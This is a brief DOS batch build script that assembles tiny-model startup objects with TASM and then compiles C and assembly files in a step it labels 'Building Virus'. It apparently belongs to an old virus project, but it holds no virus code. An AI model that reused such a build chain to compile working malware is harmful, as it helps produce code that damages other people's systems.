   @echo off
   echo Building Model Tiny startups
   TASM /M /MX /Q /T /D__TINY__    c0, c0t
   echo Building Virus
   bcc -L. -r- -tDc -mt -3 -Z -d -1 ficknitz.c fse.asm
   echo Done.
